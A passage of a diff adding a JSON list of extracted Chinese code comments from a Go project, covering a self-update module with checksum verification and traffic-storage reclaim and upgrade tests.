+    "path": "source/selfupdate/stage.go",
+    "Start": 280,
+    "End": 371,
+    "Line": 21,
+    "Text": "// maxBinarySize 限制解压出来的二进制体积，防止畸形 zip 把磁盘写满。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 416,
+    "End": 500,
+    "Line": 24,
+    "Text": "// Phase 是升级过程中的阶段，直接用作 SSE 事件里的 phase 字段。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 733,
+    "End": 841,
+    "Line": 36,
+    "Text": "// Progress 由调用方提供，用来把进度推给前端。pct 仅在下载阶段有意义（0-100），"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 842,
+    "End": 866,
+    "Line": 37,
+    "Text": "// 其余阶段传 -1。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 918,
+    "End": 1021,
+    "Line": 40,
+    "Text": "// Stage 下载指定 Release 的当前平台发布包，校验后把新二进制暂存为 artex.new。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 1025,
+    "End": 1129,
+    "Line": 42,
+    "Text": "// 走的是完整 zip 而不是裸二进制，理由有两个：现有 Release 的 SHA256SUMS 本来就"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 1130,
+    "End": 1239,
+    "Line": 43,
+    "Text": "// 只覆盖 zip，走 zip 不需要改 CI，也能兼容已经发布出去的历史版本；zip 里还带着"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 1240,
+    "End": 1340,
+    "Line": 44,
+    "Text": "// skills/，为将来同步内置 skill 留了口子。代价只是多下载 skills 那几百 KB。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 1344,
+    "End": 1438,
+    "Line": 46,
+    "Text": "// 函数返回即代表暂存完成，调用方随后优雅关闭并以 ExitRestart 退出。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 2410,
+    "End": 2517,
+    "Line": 80,
+    "Text": "// 临时文件全部落在目标目录里，保证最后的 rename 是同一文件系统内的原子操作"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 2519,
+    "End": 2593,
+    "Line": 81,
+    "Text": "// （跨设备 rename 会失败，而 /tmp 常常是独立挂载点）。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 3369,
+    "End": 3461,
+    "Line": 108,
+    "Text": "// 暂存件自己的 sha256 单独存一份：下次启动换装前还要再校验一次，"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 3463,
+    "End": 3535,
+    "Line": 109,
+    "Text": "// 防止暂存后到重启前这段时间里文件被改动或写坏。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 4068,
+    "End": 4158,
+    "Line": 127,
+    "Text": "// 标记只影响自动回滚能力，暂存件本身已就位，不因此中断升级。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 4362,
+    "End": 4446,
+    "Line": 135,
+    "Text": "// fetchSums 下载并解析 SHA256SUMS，返回 文件名 → 十六进制摘要。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 5123,
+    "End": 5213,
+    "Line": 158,
+    "Text": "// parseSums 解析 sha256sum 风格的清单，返回 文件名 → 十六进制摘要。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 5217,
+    "End": 5325,
+    "Line": 160,
+    "Text": "// 第一个字段必须是 64 位十六进制才收录。只按\"恰好两个字段\"判断是不够的——"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 5326,
+    "End": 5428,
+    "Line": 161,
+    "Text": "// 任意一行两个单词的说明文字都会被当成合法条目，把垃圾值塞进摘要表，"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 5429,
+    "End": 5486,
+    "Line": 162,
+    "Text": "// 真正的资产反而可能匹配到错误的摘要。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 5604,
+    "End": 5686,
+    "Line": 166,
+    "Text": "// 格式为 \"<sha256>  <filename>\"（sha256sum 用双空格；shasum 的二进制"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 5689,
+    "End": 5731,
+    "Line": 167,
+    "Text": "// 模式会给文件名加 * 前缀）。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 6217,
+    "End": 6308,
+    "Line": 195,
+    "Text": "// download 把资产写入 dst，同时计算 SHA256 并按 Content-Length 汇报进度。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 7185,
+    "End": 7250,
+    "Line": 223,
+    "Text": "// get 发起一个受白名单约束的 GET，返回响应体。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 7766,
+    "End": 7829,
+    "Line": 244,
+    "Text": "// extractBinary 从发布包里取出 artex 可执行文件。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 7833,
+    "End": 7933,
+    "Line": 246,
+    "Text": "// 包内结构是 artex-<版本>-<os>-<arch>/artex，但这里按**基名**匹配而不是拼完整"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 7934,
+    "End": 8051,
+    "Line": 247,
+    "Text": "// 路径：版本号在包名里出现过一次，拼错一个字符就整个升级失败，按基名找更耐改。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 9158,
+    "End": 9265,
+    "Line": 290,
+    "Text": "// checkWritable 提前确认目录可写。没有这一步，非 root 运行、或二进制被放在系统"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 9266,
+    "End": 9342,
+    "Line": 291,
+    "Text": "// 目录时，会在下载完几十 MB 之后才在换装那一刻失败。"
+  },
+  {
+    "path": "source/selfupdate/stage.go",
+    "Start": 9682,
+    "End": 9780,
+    "Line": 303,
+    "Text": "// progressWriter 统计已写字节并限频汇报，避免每个 32KiB 分块都推一条 SSE。"
+  },
+  {
+    "path": "source/traffic/reclaim_test.go",
+    "Start": 1809,
+    "End": 1839,
+    "Line": 54,
+    "Text": "// 回收在后台分块进行"
+  },
+  {
+    "path": "source/traffic/reclaim_test.go",
+    "Start": 4967,
+    "End": 5006,
+    "Line": 145,
+    "Text": "// 必须收敛，不能卡在预算里"
+  },
+  {
+    "path": "source/traffic/traffic.go",
+    "Start": 48745,
+    "End": 48844,
+    "Line": 1272,
+    "Text": "// 归档路径即使一个历史 host 目录都没有(新装机的流量只落在 SQLite + _blobs)"
+  },
+  {
+    "path": "source/traffic/traffic.go",
+    "Start": 48846,
+    "End": 48946,
+    "Line": 1273,
+    "Text": "// 也必须留下 journal：崩溃点若落在 PostgreSQL 提交与 SQLite 提交之间，重启后"
+  },
+  {
+    "path": "source/traffic/traffic.go",
+    "Start": 48948,
+    "End": 49054,
+    "Line": 1274,
+    "Text": "// SQLite 事务被回滚，只有这份 journal 能让恢复流程补做 host 行的删除。少了它，"
+  },
+  {
+    "path": "source/traffic/traffic.go",
+    "Start": 49056,
+    "End": 49116,
+    "Line": 1275,
+    "Text": "// 已转冷任务的独占流量会永久留在热库里。"
+  },
+  {
+    "path": "source/traffic/traffic.go",
+    "Start": 75485,
+    "End": 75588,
+    "Line": 2040,
+    "Text": "// 精简为最小索引：仅保留定位所需字段 + 响应码/长度，不带任何响应内容。"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 1349,
+    "End": 1405,
+    "Line": 44,
+    "Text": "// 三条历史流量，含一条 legacy path<>'' 的行"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 2322,
+    "End": 2345,
+    "Line": 70,
+    "Text": "// ---- 新版本接管"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 2474,
+    "End": 2537,
+    "Line": 77,
+    "Text": "// 1. 必须是同一个文件，不能悄悄开了个新空库"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 2984,
+    "End": 3014,
+    "Line": 89,
+    "Text": "// 2. 历史数据全部可见"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 3147,
+    "End": 3180,
+    "Line": 94,
+    "Text": "// 3. 历史全文索引仍可搜"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 3434,
+    "End": 3461,
+    "Line": 104,
+    "Text": "// 4. 历史正文仍可读"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 3630,
+    "End": 3681,
+    "Line": 110,
+    "Text": "// 5. 旧库不会被误判为已启用增量回收"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 3766,
+    "End": 3835,
+    "Line": 114,
+    "Text": "// 6. 删除仍然正常工作，且回收流程在旧库上能收敛"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 4143,
+    "End": 4183,
+    "Line": 123,
+    "Text": "// 7. legacy path<>'' 的行没被牵连"
+  },
+  {
+    "path": "source/traffic/upgrade_test.go",
+    "Start": 5028,
+    "End": 5055,
+    "Line": 151,
+    "Text": "// 旧版本二进制接管"
+  }
+]
